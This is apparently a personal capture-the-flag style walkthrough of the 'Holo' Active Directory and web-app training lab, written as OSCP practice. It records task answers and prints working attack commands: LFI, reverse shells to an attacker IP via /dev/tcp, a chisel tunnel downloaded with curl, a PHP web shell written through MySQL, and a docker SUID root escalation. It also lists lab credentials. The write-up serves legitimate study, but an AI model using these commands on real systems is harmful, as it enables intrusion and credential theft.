
Name: Hololive
Date:  
Difficulty: Hard
Description: Holo is an Active Directory (AD) and Web-App attack lab that aims to teach core web attack vectors and more advanced AD attack techniques. This network simulates an external penetration test on a corporate network. 
Better Description:  
Goals: OSCP revision, demonstrate how far I have come since Throwback..
Learnt:
- Tie functionality of pages together
- deepce is linpeas for docker containers
- Chisel
- Golang compilation nitty gritty
- More Situational Awareness or may the trench that is Dunning Kroger
- Walk the the Webserver directory on at a time before/after/due second reverse shell


Returning to this after lots of Hack the Box I decided to follow along with [Alh4zr3d](https://www.youtube.com/watch?v=PqnnKMU3XMk) purely to fit with my work schedule that include another siz hours plus after this. I need mentorship and I need practical experience that is less-head-smashing-problem-solving-stress to pace out the the marathon of learning everything for the exam I need. Some humor and Cthulu mythos is great addition to my day. It was very enjoyable to do this this way. I learnt alot and loads of fun.

Tasks 0 - 21 [Part 1 Alh4zr3d](https://www.youtube.com/watch?v=PqnnKMU3XMk)
Task 22 -  [Part 2 from 1:53:00 Alh4zr3d](https://www.youtube.com/watch?v=-a10dxWbp5M) - 


## Initial Recon

The inital nmap:
![initnmap](init-recon-nmap-webserver.png)

![nikto](nikto-init-webserver.png)

#### Task 8 Answers

What is the last octet of the IP address of the public-facing web server?
```
33
```
How many ports are open on the web server?
```
3
```
What CME is running on port 80 of the web server?
```
wordpress
```
What version of the CME is running on port 80 of the web server?
```
5.5.3
```
What is the HTTP title of the web server?
```
holo.live
```

## Web App Exploitation

#### Task 9 Answers

![task9](Screenshots/gobuster-task9.png)

```bash
gobuster vhost -u http://holo.live -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt
```

What domains loads images on the first web page?
```
www.holo.live
```
What are the two other domains present on the web server? Format: Alphabetical Order
```
admin.holo.live, dev.holo.live
```

```bash
git clone https://github.com/danielmiessler/SecLists.git
```


#### Task 10

![](localpathwp.png)

What file leaks the web server's current directory?

```
robots.txt
```

What file loads images for the development domain?

`dev.holo.live/img.php?file=images/$file.jpg`

```
img.php
```

What is the full path of the credentials file on the administrator domain?

`admin.hole.live/robots.txt`

```
/var/www/admin/supersecretdir/creds.txt
```

#### Task 11

I suggest Learning about Ansible and Packer or you could use test file inclusion 
`dev.holo.live/img.php?file=images/$file.jpg`

Downloading a Ubuntu server and going back to a ToDo list of mine in the background...

![1000](fileinclusion.png)

#### Task 12

What file is vulnerable to LFI on the development domain?
```
img.php
```
What parameter in the file is vulnerable to LFI?
```
file
```

What file found from the information leak returns an HTTP error code 403 on the administrator domain?

- I missed this because already tried then went back to use the lfi while I download a ubuntu server to try build some Vulnerable and Safe VMs machines with packer

```
/var/www/admin/supersecretdir/creds.txt
```

Using LFI on the development domain read the above file. What are the credentials found from the file?
```
admin:DBManagerLogin
```

Because the lfi you can then grab all the files! Be aware of the difference.

![](passwordchanges.png)

There is a non-real world vulnerablity with a use of PHP super global variable creation for view 
![](vistors.png)

[Alh4zr3d](https://www.youtube.com/channel/UCz-Z-d2VPQXHGkch0-_KovA) spotted this I just LFI rather than log in
![1000](alspottedthis.png)

#### Task 13

![](vulnerabledashboard.png)

What file is vulnerable to RCE on the administrator domain?

```
dashboard.php
```

What parameter is vulnerable to RCE on the administrator domain?

```
cmd
```

What user is the web server running as?

```
www-data
```

#### Task 14

N/A

![](docker.png)

#### Task 15

N/A

![](cgroups.png)

![](cgroupcat.png)

## Task 16 

The best method is `nc -zv 192.168.100.1 1-65535`

What is the Default Gateway for the Docker Container?
```
192.168.100.1
```
What is the high web port open in the container gateway?
```
8080
```
What is the low database port open in the container gateway?
```
3306
```

For those following along with the Video
![](chiselworksthisway.png)

## Task 17

Lesson, walk up the webserver directory, this may not have got picked up.

![](db_connect.png)
What is the server address of the remote database?
```
192.168.100.1
```
What is the password of the remote database?  
```
!123SecureAdminDashboard321!
```
What is the username of the remote database?  
```
admin
```
What is the database name of the remote database?  
```
DashboardDB
```
What username can be found within the database itself?
```
gurag
```

![](mysqldbpass.png)

#### Task 18 

![](awesompx.png)

What user is the database running as?
```
www-data
```

## Task 19 

`find / -perm -u=s -type f 2>/dev/null`

[Docker should never have suid bit set.](https://gtfobins.github.io/gtfobins/docker/#shell)

What is the full path of the binary with an SUID bit set on L-SRV01?
```
/usr/bin/docker
```
What is the full first line of the exploit for the SUID bit?
```
sudo install -m =xs $(which docker) .
```

![](coolme.png)

```bash
sudo install -m =xs $(which docker) .
./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
```

## Task 21

What non-default user can we find in the shadow file on L-SRV01?
```
linux-admin
```

## To Get Here

```bash
# login in to 
http://admin.holo.live/index.php
# admin:DBManagerLogin!
http://admin.holo.live/dashboard.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/443+<%261'

# Setup proxychains and chisel
./chisel server -p 8888 --reverse
# curl chisel run client 
curl http://10.50.103.91/chisel -o chisel
./chisel client 10.50.103.91:8888 R:socks

proxychains mysql -h 192.168.100.1 -u admin -p
# !123SecureAdminDashboard321!
use DashboardDB;
# required create RCE on docker host
# if it does not exist
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/nvmcmd.php';

proxychains curl "http://192.168.100.1:8080/nvmcmd.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/445+<%261'"

sudo install -m =xs $(which docker) .
./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh

```

[From 1:30:00 Alh4zr3d](https://www.youtube.com/watch?v=-a10dxWbp5M)

#### Task 22

The /etc/shadow has vandalised or broken so I could not crack it
```
linuxrulez
```

#### Task 23 - 28

```lua
Nmap scan report for 10.200.107.31
Host is up (0.21s latency).
Not shown: 92 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
```

```
DBManagerLogin!
!123SecureAdminDashboard321!
```

reset for admin: 
```
b69a9e454439e1316427e518adcd887c38e8d0bbaebbdaf4831daf99431f698d93a3142e87eaca7ad4b315d18be7b0019d02
```

reset for gurag: 
```
09f7ab735e40f816e5913df5e157a0b271d1fd8c3665986bc782485322f06ee1fd2b5c5420594171050047280da9fcdeb80e
```

Set in the url to the `user_token=`  on requesting gurag password. Apparently very unrealistic reset password functionality. I have tried reset password testing on CTFs and there never has been one on all the machines I have done so far. Putting it on the CTFs lokup list

What user can we control for a password reset on S-SRV01?
```
gurag
```
What is the name of the cookie intercepted on S-SRV01?
```
user_token
```
What is the size of the cookie intercepted on S-SRV01?
```
110
```
What page does the reset redirect you to when successfully authenticated on S-SRV01?
```
reset.php
```

#### Task 29

Thankfully Al uses Empire for the stream so my OSCP preparation continue to press on in a fun manner. 
https://learn.microsoft.com/en-us/dotnet/core/install/linux-debian
https://bc-security.gitbook.io/empire-wiki/quickstart/installation
Remember to consider the use of telemetry that comes with .NET by opting out with environment variables. 

gurag : password

linux-admin linuxrulez

![](images.png)

I wondered what was going on, I cant get execution but AV is actually removing it. As much as I have enjoyed the stream I will return to this probably in two days time after I have read everything in the next couple of sections as there is some divergence of path.

[2:57:02](https://www.youtube.com/watch?v=-a10dxWbp5M)